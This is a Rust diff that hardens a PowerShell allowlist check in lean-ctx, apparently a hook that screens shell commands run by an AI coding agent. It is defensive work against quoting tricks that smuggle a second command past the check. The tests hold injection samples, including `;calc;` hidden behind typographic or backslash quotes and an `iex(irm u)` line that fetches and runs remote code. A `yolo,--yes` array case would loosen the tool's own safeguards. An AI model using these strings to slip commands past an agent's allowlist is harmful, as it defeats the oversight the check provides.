@@ -12,7 +12,7 @@
 //! (`read`/`grep`/`ls`) quoted for PowerShell, denied when the allowlist blocks
 //! it in `enforce` mode, or left to PowerShell untouched.
 
-use super::file_rewrite::{direct_rewrite, is_compound, is_leanctx_call, passes_rewrite_guards};
+use super::file_rewrite::{direct_rewrite, is_compound, passes_rewrite_guards};
 use super::{shell_quote, shell_tokenize};
 
 /// True when a host tool name is a PowerShell tool (Claude Code's `PowerShell`,
@@ -43,12 +43,88 @@ pub(super) fn decide(cmd: &str, binary: &str) -> PowerShellDecision {
     // wrap cannot carry PowerShell (see the module docs), so enforce here and
     // refuse instead. `check_shell_allowlist` blocks only in `enforce` mode;
     // `warn` logs and `off` skips, exactly as the wrap would have.
-    if !is_leanctx_call(cmd, binary)
-        && let Err(msg) = crate::core::shell_allowlist::check_shell_allowlist(cmd)
-    {
-        return PowerShellDecision::Deny(msg.to_string());
+    // A lean-ctx call is checked too: only a plain one is exempt from the
+    // allowlist, and none may loosen lean-ctx's own settings.
+    match allowlist_denial(cmd, binary) {
+        Some(msg) => PowerShellDecision::Deny(msg),
+        None => PowerShellDecision::Passthrough,
     }
-    PowerShellDecision::Passthrough
+}
+
+/// The allowlist verdict for a PowerShell command line that runs unwrapped.
+///
+/// PowerShell reads the typographic quotes `‘ ’ ‚ ‛` and `“ ” „` like `'`
+/// and `"`; the POSIX-based checks do not, so `"x“; calc; “y"` looked like
+/// one quoted word. They are checked as the ASCII quotes PowerShell takes
+/// them for.
+pub(super) fn allowlist_denial(cmd: &str, binary: &str) -> Option<String> {
+    let as_read: String = cmd
+        .chars()
+        .map(|c| match c {
+            '\u{2018}' | '\u{2019}' | '\u{201A}' | '\u{201B}' => '\'',
+            '\u{201C}' | '\u{201D}' | '\u{201E}' => '"',
+            // A backslash is an ordinary character to PowerShell, not an
+            // escape: `\"` ends a string there. The POSIX-based checks read
+            // it as an escape, so they get `/` (still a path separator).
+            '\\' => '/',
+            other => other,
+        })
+        .collect();
+    use crate::core::shell_allowlist::{self, ShellSecurity};
+    // Never a "plain lean-ctx call": PowerShell separates statements and
+    // builds arrays differently, so every PowerShell line gets the full
+    // check, lean-ctx segments included.
+    let _ = binary;
+    if ShellSecurity::resolve() == ShellSecurity::Enforce
+        && let Some(msg) = leanctx_argument_constructs(&as_read)
+    {
+        return Some(msg);
+    }
+    shell_allowlist::check_shell_allowlist(&as_read)
+        .err()
+        .map(|msg| msg.to_string())
+}
+
+/// A lean-ctx call whose words PowerShell would rebuild: an unquoted `,`
+/// makes an array (`lean-ctx yolo,--yes` passes two arguments) and `@`
+/// splats one, so the words the check sees are not the ones lean-ctx gets.
+fn leanctx_argument_constructs(line: &str) -> Option<String> {
+    let mentions_leanctx = line
+        .split(|c: char| c.is_whitespace() || matches!(c, ';' | '|' | '&' | '(' | ')'))
+        .any(|w| {
+            matches!(
+                w.trim_matches(['\'', '"'])
+                    .rsplit(['/', '\\'])
+                    .next()
+                    .map(str::to_ascii_lowercase)
+                    .as_deref(),
+                Some("lean-ctx" | "lean-ctx.exe")
+            )
+        });
+    if !mentions_leanctx {
+        return None;
+    }
+    let (mut single, mut double) = (false, false);
+    let mut chars = line.chars();
+    while let Some(c) = chars.next() {
+        match c {
+            '`' if !single => {
+                chars.next();
+            }
+            '\'' if !double => single = !single,
+            '"' if !single => double = !double,
+            ',' | '@' if !single && !double => {
+                return Some(format!(
+                    "[BLOCKED — DO NOT RETRY] An unquoted `{c}` in a PowerShell line that runs \
+                     lean-ctx builds an array or splats arguments, so lean-ctx would receive \
+                     other words than the ones checked. Quote the argument or write the \
+                     words out."
+                ));
+            }
+            _ => {}
+        }
+    }
+    None
 }
 
 /// Rewrite a single PowerShell read/search/list command to the matching
@@ -264,6 +340,63 @@ mod tests {
         for mode in ["warn", "off"] {
             let decision = with_security(mode, || decide("Remove-Item -Recurse src", BIN));
             assert_eq!(decision, PowerShellDecision::Passthrough, "{mode}");
+        }
+    }
+
+    /// PowerShell takes `“ ”` for quotes: `"x“; calc; “y"` runs `calc`. Such a
+    /// line is never a plain lean-ctx call, and the check reads its quotes as
+    /// PowerShell does.
+    #[test]
+    fn typographic_quotes_are_read_as_powershell_reads_them() {
+        let cmd = "lean-ctx doctor \"x\u{201C}; calc; \u{201C}y\"";
+        assert_eq!(
+            super::super::file_rewrite::leanctx_call(cmd, BIN),
+            Some(super::super::file_rewrite::LeanCtxCall::Other)
+        );
+        assert_eq!(
+            super::super::file_rewrite::leanctx_call("lean-ctx doctor \u{2018}x\u{2019}", BIN),
+            Some(super::super::file_rewrite::LeanCtxCall::Other)
+        );
+        let decision = with_security("enforce", || {
+            crate::test_env::set_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE", "lean-ctx,git");
+            let decision = decide(cmd, BIN);
+            crate::test_env::remove_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE");
+            decision
+        });
+        assert!(
+            matches!(decision, PowerShellDecision::Deny(_)),
+            "{decision:?}"
+        );
+    }
+
+    /// `\` is no escape in PowerShell: `\"` ends the string, so `;calc;`
+    /// below runs as a statement. And `yolo,--yes` is an array PowerShell
+    /// hands lean-ctx as two arguments.
+    #[test]
+    fn backslash_quotes_and_arrays_are_read_as_powershell_reads_them() {
+        let decisions = with_security("enforce", || {
+            crate::test_env::set_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE", "lean-ctx,git");
+            let decisions: Vec<_> = [
+                (r#"lean-ctx doctor \" " ;calc; " \""#, true),
+                (r#"git status \" " ;iex(irm u); " \""#, true),
+                ("lean-ctx yolo,--yes", true),
+                ("lean-ctx read @args", true),
+                ("lean-ctx read 'a,b.md'", false),
+                ("git status", false),
+                (r"lean-ctx read src\main.rs", false),
+            ]
+            .into_iter()
+            .map(|(cmd, denied)| (cmd, denied, decide(cmd, BIN)))
+            .collect();
+            crate::test_env::remove_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE");
+            decisions
+        });
+        for (cmd, denied, decision) in decisions {
+            assert_eq!(
+                matches!(decision, PowerShellDecision::Deny(_)),
+                denied,
+                "{cmd}: {decision:?}"
+            );
         }
     }
 
